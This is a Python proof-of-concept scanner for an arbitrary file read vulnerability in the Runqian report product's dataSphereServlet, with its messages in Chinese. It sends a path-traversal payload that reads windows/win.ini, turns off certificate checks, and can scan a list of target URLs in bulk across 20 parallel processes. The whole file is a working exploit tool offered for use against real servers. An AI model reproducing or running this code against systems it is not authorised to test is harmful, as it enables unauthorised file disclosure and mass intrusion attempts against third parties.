import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """
            
   ___   __   ___   ___ 
  / o |,'_/  / o.) / o.)
 /  ,'/ /_n / o \ / o \ 
/_/`_\|__,'/___,'/___,' 
                        

"""
    print(test)


def poc(target):
    payload = "/demo/servlet/dataSphereServlet?action=11"
    data = "path=../../../../../../../../../../../windows/win.ini&content=&mode="
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        response = requests.post(target + payload, data=data, headers=headers, timeout=10, verify=False)
        if "fonts" in response.text and "extensions" in response.text:
            print(f"[+] {target} 存在润乾报表 dataSphereServlet 任意文件读取漏洞")
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")


def main():
    banner()
    parser = argparse.ArgumentParser(description="润乾报表 dataSphereServlet 任意文件读取漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()